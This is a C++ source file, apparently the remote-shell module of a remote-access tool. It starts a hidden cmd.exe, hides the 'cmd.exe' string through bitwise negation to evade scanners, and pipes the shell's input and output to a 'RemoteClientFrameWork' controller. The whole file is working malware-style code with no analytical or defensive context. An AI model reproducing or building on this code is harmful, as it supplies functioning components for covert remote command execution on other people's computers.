#include "../inc/CmdProcess.h"
#include "../../RemoteClient/RemoteClientFrameWork.h"

static char EngChar[]={~'\\',~'c',~'m',~'d',~'.',~'e',~'x',~'e','\0'};

BOOL CmdProcess::Initialize( CmdProcess_IO &info )
{
	SECURITY_ATTRIBUTES sa;
	sa.nLength=sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor=0;
	sa.bInheritHandle=TRUE;   

	if(!CreatePipe(&m_hReadPipe1,&m_hWritePipe1,&sa,0))
	{
		return FALSE;
	}
	if(!CreatePipe(&m_hReadPipe2,&m_hWritePipe2,&sa,0))
	{
		return FALSE;
	}

	STARTUPINFO si;
	ZeroMemory(&si,sizeof(si));
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = m_hReadPipe2;
	si.hStdOutput = si.hStdError = m_hWritePipe1;
	
	//printf(EngChar);

	char cmdLine[256] = {0};
	GetSystemDirectory(cmdLine,sizeof(cmdLine));
	for (unsigned int i=0;i<strlen(EngChar);i++)
	{
		EngChar[i]=~EngChar[i];
	}

	strcat_s(cmdLine,EngChar);

	
	PROCESS_INFORMATION ProcessInformation;  

	//DEBUG_PROCESS for exit while this process was crashed.
	if(CreateProcess(cmdLine,NULL,NULL,NULL,TRUE,0,NULL,NULL,&si,&ProcessInformation) == 0)  
	{  
		return FALSE;  
	} 
	return TRUE;
}

void CmdProcess::run()
{
	//Receive buffer size must be large than 3
	assert(sizeof(m_RecvBuffer)>3);

	DWORD dwRere=0;

	while(TRUE)
	{
		
		PeekNamedPipe(m_hReadPipe1,m_RecvBuffer, sizeof(m_RecvBuffer),&m_lBytesRead,0,0);
		if(m_lBytesRead)
		{
		memset(m_RecvBuffer, 0, sizeof(m_RecvBuffer));  

		if(ReadFile(m_hReadPipe1,m_RecvBuffer,sizeof(m_RecvBuffer)-2,&m_lBytesRead,0))
		{
			if (m_RecvBuffer[sizeof(m_RecvBuffer)-3]&0x80)
			{
				if(!ReadFile(m_hReadPipe1,m_RecvBuffer+sizeof(m_RecvBuffer)-2,1,&dwRere,0))
					break;
			}
			CmdProcess_I In;
			In.Buffer=m_RecvBuffer;
			In.size=m_lBytesRead+dwRere;
			Recv(In);
		}
		else
		{
			break;
		}
		}
		else
		{
			Sleep(300);
		}
	}
}

size_t CmdProcess::Send( CmdProcess_O &Out )
{
 	WriteFile(m_hWritePipe2, "\r\n",2,&m_lBytesWrite,0);  
 	Sleep(100);  

	if(!WriteFile(m_hWritePipe2, Out.Buffer,Out.size,&m_lBytesWrite,0))                       
	{    
		return 0;  
	}  
	return m_lBytesWrite;
}

void CmdProcess::Recv( CmdProcess_I &in )
{
	G_RemoteFrameWork.OnCmdReply(in.Buffer,in.size);
}

void CmdProcess::Close()
{
	CloseHandle(m_hReadPipe1);
	CloseHandle(m_hReadPipe2);
	CloseHandle(m_hWritePipe1);
	CloseHandle(m_hWritePipe2);
}
 